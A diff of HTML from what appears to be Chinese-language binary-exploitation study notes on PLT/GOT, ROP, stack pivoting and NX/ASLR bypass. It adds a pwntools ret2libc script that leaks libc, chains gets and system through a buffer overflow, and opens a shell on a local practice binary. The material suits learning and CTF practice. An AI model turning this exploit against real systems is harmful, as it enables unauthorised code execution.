@@ -1548,27 +1548,34 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#_3" title="栈转移" class="md-nav__link">
+    栈转移
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" title="漏洞挖掘方法" class="md-nav__link">
+  <a href="#_4" title="漏洞挖掘方法" class="md-nav__link">
     漏洞挖掘方法
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_4" title="保护" class="md-nav__link">
+  <a href="#_5" title="保护" class="md-nav__link">
     保护
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" title="打开就退出了" class="md-nav__link">
+  <a href="#_6" title="打开就退出了" class="md-nav__link">
     打开就退出了
   </a>
   
@@ -1907,27 +1914,34 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#_3" title="栈转移" class="md-nav__link">
+    栈转移
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" title="漏洞挖掘方法" class="md-nav__link">
+  <a href="#_4" title="漏洞挖掘方法" class="md-nav__link">
     漏洞挖掘方法
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_4" title="保护" class="md-nav__link">
+  <a href="#_5" title="保护" class="md-nav__link">
     保护
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" title="打开就退出了" class="md-nav__link">
+  <a href="#_6" title="打开就退出了" class="md-nav__link">
     打开就退出了
   </a>
   
@@ -1968,7 +1982,8 @@ https://www.exploit-db.com/shellcode/
 </pre></div>
 
 <h2 id="plt-got-pltgot">plt got .plt.got<a class="headerlink" href="#plt-got-pltgot" title="Permanent link">&para;</a></h2>
-<p><img alt="plt &amp;got" src="2018-11-15-23-25-29.png" />
+<p><img alt="plt-&gt;got" src="2018-11-15-23-44-54.png" />
+<img alt="plt &amp;got" src="2018-11-15-23-25-29.png" />
 plt 指向got,采用延时绑定。printf函数中，0x404c010实际内容是下一条指令<code>push 0</code>,
 而plt.got是已经绑定的， puts函数的0x804bff4是指向实际puts函数的</p>
 <h2 id="shellcode">shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h2>
@@ -1994,6 +2009,34 @@ sh:
 <ol>
 <li>ROPgadget 得到代码片断</li>
 <li>cd80c3 就是int0x80;ret,s使用<code>ROPgadget --binary {binaryname} --opcode cd80c3</code>来寻找</li>
+<li>动态链接找不到 int 0x80,需要构造rop
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;ret2lib&#39;</span><span class="p">)</span>
+
+<span class="n">puts_got_plt</span> <span class="o">=</span> <span class="mh">0x804a01c</span>
+<span class="n">puts_offset</span> <span class="o">=</span><span class="mh">0x00069930</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">puts_got_plt</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="bp">False</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">puts_offset</span> <span class="c1"># get libc base address</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="n">gets_off</span><span class="o">=</span><span class="mh">0x000690d0</span>             <span class="c1"># objdump -D libc |grep gets@</span>
+<span class="n">system_off</span><span class="o">=</span> <span class="mh">0x0003e8f0</span>          <span class="c1"># objdump -D libc |grep system@</span>
+<span class="n">gets</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">gets_off</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">system_off</span>
+<span class="n">buf</span><span class="o">=</span><span class="mh">0x804b000</span> <span class="o">-</span><span class="mi">30</span>               <span class="c1"># cat /proc/702/maps to get writable address </span>
+<span class="n">rop</span><span class="o">=</span><span class="p">[</span>
+        <span class="n">gets</span><span class="p">,</span>
+        <span class="n">system</span><span class="p">,</span>
+        <span class="n">buf</span><span class="p">,</span>
+        <span class="n">buf</span>
+        <span class="p">]</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">60</span><span class="o">+</span><span class="n">flat</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div></li>
 </ol>
 <h3 id="_2">寄存器赋值<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <p>构造栈结构
@@ -2001,16 +2044,19 @@ sh:
   3
 </pre></div>
 将eax赋值为3</p>
-<h2 id="_3">漏洞挖掘方法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_3">栈转移<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>寻找 leave;ret;指令，然后更改ebp的值即可
+leave= mov esp,ebp,pop ebp;</p>
+<h2 id="_4">漏洞挖掘方法<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 <ul>
 <li>现成CMS注意DIFF</li>
 <li>根据漏洞PATCH</li>
 <li>根据漏洞写出EXP，发动攻击 </li>
 </ul>
-<h2 id="_4">保护<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h2 id="_5">保护<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
 <p>NX:DEP 栈不可执行，可执行不可写 ROP绕过
 ALSR: 把每次载入的函数地址随机化，利用puts/printf 等leak出libc的实际地址</p>
-<h2 id="_5">打开就退出了<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h2 id="_6">打开就退出了<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
 <p>用strace分析系统调用</p>
                 
                   
